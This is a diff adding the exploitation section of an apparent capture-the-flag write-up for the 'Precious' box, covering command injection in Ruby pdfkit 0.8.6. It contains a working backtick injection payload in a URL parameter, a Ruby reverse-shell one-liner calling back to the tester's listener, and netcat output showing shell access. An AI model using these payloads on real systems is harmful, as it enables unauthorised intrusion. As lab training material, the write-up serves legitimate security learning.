@@ -126,14 +126,47 @@ As we can see the response contains the generated pdf file. Going through its co
 
 ![Precious](imgs/pdfkit.png)
 
-Searching through the internet about it, shows that it is actually a module in Ruby that generates PDFs from given URLs. Going further we can see that the version used in our web app is old and vulnerable to command injection!
-
-
 ---
 
 ### Exploitation
 
----
+#### Ruby PDFKit Command Injection
+Searching through the internet about pdfkit v0.8.6, shows that it is actually a module in Ruby that generates PDFs from given URLs. Going further, we can find that the version used in our web app is old and critically vulnerable to command injection!
+The injection works as follows: When user input (URL) gets passed to the application and if the provided URL's parameter happens to contain a URL encoded character and a shell command substitution string, it will be included in the command that PDFKit executes to render the PDF/
+```
+http://10.10.14.116:8000/?c=%20`curl http://10.10.14.116:443/`
+```
+To verify if the above injection work, I setup a local php server on port 443 and passed the above input to the app. And to no surprise, the app did make the request to the server on port 443. 
+```bash
+$ php -S 10.10.14.116:443 
+[Tue Jan 24 18:59:04 2023] PHP 8.1.12 Development Server (http://10.10.14.116:443) started
+[Tue Jan 24 18:59:08 2023] 10.10.11.189:37630 Accepted
+[Tue Jan 24 18:59:08 2023] 10.10.11.189:37630 [200]: GET /
+[Tue Jan 24 18:59:08 2023] 10.10.11.189:37630 Closing
+```
+
+We can now attempt to spawn a reverse shell to access the machine. Using the [reverse shell generator](https://www.revshells.com/), we get our ruby payload, that we append to the URL.
+```ruby
+ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.116",4242))'
+```
+
+We then setup our listener on port 4242 and send the payload to the server..
+
+```bash
+$ nc -lvnp 4242
+listening on [any] 4242 ...
+connect to [10.10.14.116] from (UNKNOWN) [10.10.11.189] 52102
+ls
+app
+config
+config.ru
+Gemfile
+Gemfile.lock
+pdf
+public
+```
+
+And we are in!!
 
 ### Post Exploitation
 
